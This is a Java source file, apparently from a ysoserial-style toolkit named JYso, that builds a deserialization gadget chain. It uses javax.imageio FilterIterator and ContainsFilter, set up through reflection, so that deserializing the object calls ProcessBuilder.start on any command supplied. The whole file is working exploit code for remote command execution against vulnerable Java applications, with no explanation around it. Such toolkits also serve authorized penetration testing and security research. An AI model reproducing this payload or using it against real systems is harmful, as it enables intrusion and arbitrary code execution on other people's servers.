package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.utils.Reflections;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Collections;

public class ImageIO implements  ObjectPayload<Object>{
    @Override
    public Object getObject(String command) throws Exception {
        UtilFactory uf = new UtilFactory();
        String args[] = {command};
        return makeImageIO(uf, args);
    }
    public static Object makeImageIO ( UtilFactory uf, String[] args ) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(args);
        Class<?> cfCl = Class.forName("javax.imageio.ImageIO$ContainsFilter");
        Constructor<?> cfCons = cfCl.getDeclaredConstructor(Method.class, String.class);
        cfCons.setAccessible(true);

        // nest two instances, the 'next' of the other one will be skipped,
        // the inner instance then provides the actual target object
        Object filterIt = makeFilterIterator(
                makeFilterIterator(Collections.emptyIterator(), pb, null),
                "foo",
                cfCons.newInstance(ProcessBuilder.class.getMethod("start"), "foo"));

        return uf.makeIteratorTrigger(filterIt);
    }
    public static Object makeFilterIterator ( Object backingIt, Object first, Object filter )
            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, Exception {
        Class<?> fiCl = Class.forName("javax.imageio.spi.FilterIterator");
        Object filterIt = Reflections.createWithoutConstructor(fiCl);
        Reflections.setFieldValue(filterIt, "iter", backingIt);
        Reflections.setFieldValue(filterIt, "next", first);
        Reflections.setFieldValue(filterIt, "filter", filter);
        return filterIt;
    }
}
